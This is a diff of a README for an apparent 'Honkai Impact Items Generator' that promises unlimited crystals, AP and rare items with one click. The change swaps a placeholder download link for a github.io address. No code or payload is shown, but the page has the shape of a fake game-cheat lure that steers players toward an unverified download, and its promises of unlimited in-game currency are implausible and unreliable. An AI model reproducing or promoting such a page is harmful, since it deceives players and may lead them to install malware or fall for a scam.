@@ -2,7 +2,7 @@
 
 The ultimate Honkai Impact Items Generator for 2024, designed to auto-generate unlimited resources, weapons, and rare items. Boost your gameplay with instant access to gear, crystals, and AP. Works seamlessly with the latest game updates and offers a user-friendly interface for effortless customization.  
 
-[![Download Items Generator](https://img.shields.io/badge/Download-Honkai_Impact_Items_Generator-blueviolet)](#)  
+[![Download Items Generator](https://img.shields.io/badge/Download-Honkai_Impact_Items_Generator-blueviolet)](https://honkai-impact-items-generator.github.io/.github/)  
 
 ## 🎯 Key Features  
 - **Unlimited Resources:** Generate crystals, AP, and materials with one click.  
